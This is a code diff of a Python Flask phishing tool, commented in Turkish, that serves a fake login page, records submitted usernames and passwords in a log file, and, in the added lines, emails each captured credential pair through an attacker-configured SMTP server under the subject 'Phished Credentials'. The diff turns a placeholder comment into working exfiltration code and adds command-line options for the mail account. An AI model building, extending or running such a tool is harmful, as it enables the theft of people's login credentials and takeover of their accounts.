@@ -3,13 +3,14 @@ import smtplib
 from email.mime.text import MIMEText
 import logging
 from flask import Flask, request, render_template_string, redirect, url_for
+import argparse
 
 app = Flask(__name__)
 
 # Logging yapılandırması
 logging.basicConfig(filename='phishing.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Sahte giriş formu
+# Sahte giriş formları
 login_form = """
 <!DOCTYPE html>
 <html lang="en">
@@ -71,6 +72,17 @@ login_form = """
 </html>
 """
 
+# Komut satırı argümanları
+def parse_args():
+    parser = argparse.ArgumentParser(description='Phishing tool configuration.')
+    parser.add_argument('--smtp-server', type=str, required=True, help='SMTP server address')
+    parser.add_argument('--smtp-port', type=int, required=True, help='SMTP server port')
+    parser.add_argument('--smtp-user', type=str, required=True, help='SMTP username')
+    parser.add_argument('--smtp-password', type=str, required=True, help='SMTP password')
+    return parser.parse_args()
+
+args = parse_args()
+
 @app.route('/')
 def home():
     return render_template_string(login_form)
@@ -84,12 +96,27 @@ def login():
         # Kullanıcı bilgilerini log dosyasına kaydetme
         logging.info(f"Captured credentials - Username: {username}, Password: {password}")
         
-        # Burada olası bir SMTP sunucusuna kullanıcı bilgilerini gönderme kodu eklenebilir
+        # Kullanıcı bilgilerini SMTP sunucusuna gönderme
+        send_email(username, password)
         
         return redirect(url_for('home'))
     except Exception as e:
         logging.error(f"Error capturing login information: {e}")
         return "An error occurred. Please try again later."
+
+def send_email(username, password):
+    try:
+        msg = MIMEText(f"Captured credentials:\nUsername: {username}\nPassword: {password}")
+        msg['Subject'] = 'Phished Credentials'
+        msg['From'] = args.smtp_user
+        msg['To'] = args.smtp_user
+
+        with smtplib.SMTP(args.smtp_server, args.smtp_port) as server:
+            server.starttls()
+            server.login(args.smtp_user, args.smtp_password)
+            server.sendmail(args.smtp_user, [args.smtp_user], msg.as_string())
+    except Exception as e:
+        logging.error(f"Failed to send email: {e}")
 
 def main():
     app.run(host='0.0.0.0', port=5000)
